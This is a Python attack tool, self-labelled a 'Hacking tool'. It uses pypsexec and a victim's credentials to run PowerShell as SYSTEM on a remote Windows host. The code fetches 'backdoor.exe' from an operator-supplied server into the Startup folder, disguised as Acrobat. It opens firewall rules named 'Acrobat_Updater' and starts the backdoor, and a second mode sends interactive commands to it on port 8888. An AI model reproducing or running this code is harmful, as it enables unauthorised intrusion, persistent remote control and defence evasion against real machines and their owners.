
from pypsexec.client import Client
import argparse
import http.server
import threading
import sys
import os
import time
import socket
import asyncio
import sys

# def run(server_class=http.server.HTTPServer, handler_class=http.server.BaseHTTPRequestHandler):
#     server_address = ('', 8000)
#     httpd = server_class(server_address, handler_class)
#     httpd.serve_forever()

class EchoClientProtocol(asyncio.Protocol):
    def __init__(self, message, loop):
        self.message = message
        self.loop = loop

    def connection_made(self, transport):
        transport.write(self.message.encode())
        print('Data sent: {!r}'.format(self.message))

    def data_received(self, data):
        #print('1Data received: {!r}'.format(data.decode())) raw
        print(f'Data received: {data.decode()}')

    def connection_lost(self, exc):
        print('The server closed the connection')
        print('Stop the event loop')
        self.loop.stop()


def main(args):
    # t1 = threading.Thread(target=run())
    # t1.start()
    if args.new is True:
        c = Client(args.ip, username=args.username, password=args.password)
        c.connect()
        try:
            c.create_service()
            print("Connection Established Starting Poisoning")
            stdout, stderr, rc = c.run_executable("powershell.exe" ,arguments = "-Command \"& {Invoke-WebRequest http://"+args.server+":8000/backdoor.exe -OutFile C:\\Users\\"+args.username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\"+args.executable+".exe}\"", use_system_account=True)
            print("File Send ",stdout.decode("utf-8"), stderr.decode("utf-8"), rc)
            stdout, stderr, rc = c.run_executable("powershell.exe" ,arguments = "-Command \"&  {New-NetFirewallRule -DisplayName \""+args.rule+"\" -Direction Inbound -Program C:\\Users\\"+args.username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\"+args.executable+".exe -RemoteAddress LocalSubnet -Action Allow}\"", use_system_account=True)
            print("Firewall INBOUNT Updated", stdout.decode("utf-8"), stderr.decode("utf-8"), rc)
            stdout1, stderr1, rc1 = c.run_executable("powershell.exe",arguments = "-Command \"& {New-NetFirewallRule -DisplayName \""+args.rule+"\" -Direction Outbound -Program C:\\Users\\"+args.username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\"+args.executable+".exe -RemoteAddress LocalSubnet -Action Allow}\"", use_system_account=True)
            print("Firewall OUTBOUNT Updated", stdout1.decode("utf-8"), stderr1.decode("utf-8"), rc1)
            stdout1, stderr1, rc1 = c.run_executable("powershell.exe",arguments = "-Command \"& {Start-Process -FilePath \"C:\\Users\\"+args.username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\"+args.executable+".exe\"}\"", use_system_account=True)
            print("Starting BackDoor", stdout1.decode("utf-8"), stderr1.decode("utf-8"), rc1)

            c.remove_service()
            c.disconnect()
            time.sleep(2)
            sys.exit()

        except Exception as e:
            c.remove_service()
            c.disconnect()
            print(e)
            time.sleep(2)
            sys.exit()
    if args.connect is True:
        print("OK")
        loop = asyncio.get_event_loop()
        while True:
            message = input(">>")
            if message != "q":
                try:
                    coro = loop.create_connection(lambda: EchoClientProtocol(message, loop), args.ip, 8888)
                    loop.run_until_complete(coro)
                    loop.run_forever()
                except Exception as ex:
                    print("Cannot Connect to Remote Server Exception: ",ex)
            else:
                loop.close()
                sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Hello to the new Hacking tool')
    parser.add_argument('-i', '--ip', dest='ip', default=None, required=True, help='ip of the target')
    parser.add_argument('-u', '--username', dest='username', default=True, required=True, help='Username of the target')
    parser.add_argument('-p', '--password', dest='password', default=None, required=True, help='Password of the target')
    parser.add_argument('-n', '--new', dest='new', default=None, required=False, action='store_true', help='New Connection')
    parser.add_argument('-c', '--connect', dest='connect', default=True, required=False, action='store_true' ,help='Connect to remote PC')
    parser.add_argument('-e', '--executable', dest='executable', default="Acrobat", required=False ,help='Name of executable Default Acrobat')
    parser.add_argument('-r', '--rule', dest='rule', default="Acrobat_Updater", required=False ,help='Name of filewall Rule Default Acrobat_Updater')
    parser.add_argument('-s', '--server', dest='server', default=None, required=True ,help='Server IP')

    args = parser.parse_args()

    try:
        socket.inet_aton(args.ip)
        socket.inet_aton(args.server)
        # legal
    except socket.error:
        print("NOT Legal IP")
        sys.exit(0)
    #print(args.new, args.connect)
    if args.connect is True and args.new is True:
        args.connect = False
    print (args.executable, args.rule)
    main(args)
